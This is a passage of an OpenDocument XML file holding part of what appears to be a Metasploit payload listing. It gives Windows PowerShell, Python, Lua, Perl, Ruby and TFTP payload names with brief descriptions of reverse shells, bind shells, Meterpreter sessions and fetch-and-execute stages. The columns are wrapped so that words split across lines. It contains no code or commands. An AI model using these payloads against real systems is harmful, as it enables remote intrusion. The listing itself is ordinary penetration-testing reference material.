      <text:p text:style-name="P1"><text:s text:c="4"/>ject/bind_tcp <text:s text:c="19"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/pein <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>ject/bind_tcp_rc4 <text:s text:c="15"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/pein <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ject/bind_tcp_uuid <text:s text:c="14"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/pein <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ject/reverse_named_pipe <text:s text:c="9"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker via a name</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d pipe pivot</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/pein <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ject/reverse_tcp <text:s text:c="16"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/pein <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ject/reverse_tcp_rc4 <text:s text:c="12"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/pein <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ject/reverse_tcp_uuid <text:s text:c="11"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/ping <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>back_reverse_tcp <text:s text:c="16"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to attacker and report UUI</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>D (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/powe <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rshell_bind_tcp <text:s text:c="17"/>ommand via PowerShell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/powe <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rshell_reverse_tcp <text:s text:c="14"/>ommand via PowerShell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/powe <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>rshell_reverse_tcp_ssl <text:s text:c="10"/>ommand via PowerShell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/shel <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l/bind_ipv6_tcp <text:s text:c="17"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Listen for an IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/shel <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l/bind_ipv6_tcp_uuid <text:s text:c="12"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Listen for an IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection with UUID Support (</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/shel <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l/bind_named_pipe <text:s text:c="15"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Listen for a pipe</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/shel <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l/bind_tcp <text:s text:c="22"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cmd/windows/powershell/x64/shel <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l/bind_tcp_rc4 <text:s text:c="18"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/shel <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l/bind_tcp_uuid <text:s text:c="17"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Listen for a conne</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ction with UUID Support (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/shel <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l/reverse_tcp <text:s text:c="19"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/shel <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l/reverse_tcp_rc4 <text:s text:c="15"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/shel <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l/reverse_tcp_uuid <text:s text:c="14"/>ommand via PowerShell. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>piped command shell (Windows x6</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>4) (staged). Connect back to th</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e attacker with UUID Support (W</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>indows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/shel <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l_bind_tcp <text:s text:c="22"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection and spawn a com</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mand shell (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/shel <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>l_reverse_tcp <text:s text:c="19"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to attacker and spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/vnci <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nject/bind_ipv6_tcp <text:s text:c="13"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/vnci <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nject/bind_ipv6_tcp_uuid <text:s text:c="8"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/vnci <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nject/bind_named_pipe <text:s text:c="11"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a pipe connection (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/vnci <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nject/bind_tcp <text:s text:c="18"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/vnci <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nject/bind_tcp_rc4 <text:s text:c="14"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/vnci <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nject/bind_tcp_uuid <text:s text:c="13"/>ommand via PowerShell. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection with UUID Suppo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rt (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/vnci <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nject/reverse_http <text:s text:c="14"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/vnci <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nject/reverse_https <text:s text:c="13"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64 wininet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/vnci <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nject/reverse_tcp <text:s text:c="15"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker (Windows x</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/vnci <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nject/reverse_tcp_rc4 <text:s text:c="11"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/vnci <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nject/reverse_tcp_uuid <text:s text:c="10"/>ommand via PowerShell. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/vnci <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nject/reverse_winhttp <text:s text:c="11"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTP (Windows</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell/x64/vnci <text:s/>Execute an x64 payload from a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>nject/reverse_winhttps <text:s text:c="10"/>ommand via PowerShell. Tunnel c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ommunication over HTTPS (Window</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>s x64 winhttp)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell_bind_tcp <text:s/>Interacts with a powershell ses</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>sion on an established socket c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell_reverse_ <text:s/>Interacts with a powershell ses</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp <text:s text:c="29"/>sion on an established socket c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/powershell_reverse_ <text:s/>Interacts with a powershell ses</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>tcp_ssl <text:s text:c="25"/>sion on an established SSL sock</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>et connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/meterpreter/ <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp <text:s text:c="25"/>command. Run a meterpreter ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver in Python (compatible with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2.5-2.7 &amp; 3.1+). Listen for a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/meterpreter/ <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp_uuid <text:s text:c="20"/>command. Run a meterpreter ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver in Python (compatible with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2.5-2.7 &amp; 3.1+). Listen for a c</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>onnection with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/meterpreter/ <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>reverse_http <text:s text:c="21"/>command. Run a meterpreter ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver in Python (compatible with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2.5-2.7 &amp; 3.1+). Tunnel communi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cation over HTTP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/meterpreter/ <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_https <text:s text:c="20"/>command. Run a meterpreter ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver in Python (compatible with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2.5-2.7 &amp; 3.1+). Tunnel communi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>cation over HTTP using SSL</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/meterpreter/ <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp <text:s text:c="22"/>command. Run a meterpreter ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver in Python (compatible with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2.5-2.7 &amp; 3.1+). Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/meterpreter/ <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp_ssl <text:s text:c="18"/>command. Run a meterpreter ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver in Python (compatible with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2.5-2.7 &amp; 3.1+). Reverse Python</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connect back stager using SSL</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/meterpreter/ <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp_uuid <text:s text:c="17"/>command. Run a meterpreter ser</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver in Python (compatible with</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>2.5-2.7 &amp; 3.1+). Connect back t</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>o the attacker with UUID Suppor</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/meterpreter_ <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp <text:s text:c="25"/>command. Connect to the victim</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>and spawn a Meterpreter shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/meterpreter_ <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_http <text:s text:c="21"/>command. Connect back to the a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ttacker and spawn a Meterpreter</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/meterpreter_ <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_https <text:s text:c="20"/>command. Connect back to the a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ttacker and spawn a Meterpreter</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/meterpreter_ <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp <text:s text:c="22"/>command. Connect back to the a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ttacker and spawn a Meterpreter</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/pingback_bin <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp <text:s text:c="28"/>command. Listens for a connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ion from the attacker, sends a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>UUID, then terminates</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/pingback_rev <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp <text:s text:c="25"/>command. Connects back to the</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>attacker, sends a UUID, then te</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>rminates</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/shell_bind_t <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="31"/>command. Creates an interactiv</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e shell via Python, encodes wit</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h base64 by design. Compatible</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>with Python 2.4-2.7 and 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/shell_revers <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_sctp <text:s text:c="27"/>command. Creates an interactiv</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e shell via Python, encodes wit</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h base64 by design. Compatible</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>with Python 2.6-2.7 and 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/shell_revers <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="28"/>command. Creates an interactiv</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e shell via Python, encodes wit</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h base64 by design. Compatible</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>with Python 2.4-2.7 and 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/shell_revers <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp_ssl <text:s text:c="24"/>command. Creates an interactiv</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e shell via Python, uses SSL, e</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ncodes with base64 by design. C</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ompatible with Python 2.6-2.7 a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/python/shell_revers <text:s/>Execute a Python payload from a</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_udp <text:s text:c="28"/>command. Creates an interactiv</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e shell via Python, encodes wit</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>h base64 by design. Compatible</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>with Python 2.6-2.7 and 3.4+.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/reverse_lua <text:s text:c="9"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a Lua</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/reverse_perl <text:s text:c="8"/>Creates an interactive shell vi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a perl</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/reverse_powershell <text:s text:c="2"/>Connect back and create a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell via Powershell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/reverse_ruby <text:s text:c="8"/>Connect back and create a comma</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nd shell via Ruby</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/custom/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_ipv6_tcp <text:s text:c="22"/>d from a tftp server. Custom sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ellcode stage. Listen for an IP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>v6 connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/custom/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_ipv6_tcp_uuid <text:s text:c="17"/>d from a tftp server. Custom sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ellcode stage. Listen for an IP</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>v6 connection with UUID Support</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>(Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/custom/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_named_pipe <text:s text:c="20"/>d from a tftp server. Custom sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ellcode stage. Listen for a pip</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e connection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/custom/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp <text:s text:c="27"/>d from a tftp server. Custom sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ellcode stage. Listen for a con</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nection (Windows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/custom/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp_rc4 <text:s text:c="23"/>d from a tftp server. Custom sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ellcode stage. Connect back to</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/custom/bin <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>d_tcp_uuid <text:s text:c="22"/>d from a tftp server. Custom sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ellcode stage. Listen for a con</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>nection with UUID Support (Wind</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ows x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_http <text:s text:c="23"/>d from a tftp server. Custom sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ellcode stage. Tunnel communica</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion over HTTP (Windows x64 win</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>inet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_https <text:s text:c="22"/>d from a tftp server. Custom sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ellcode stage. Tunnel communica</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tion over HTTP (Windows x64 win</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>inet)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/windows/tftp/x64/custom/rev <text:s/>Fetch and Execute an x64 payloa</text:p>
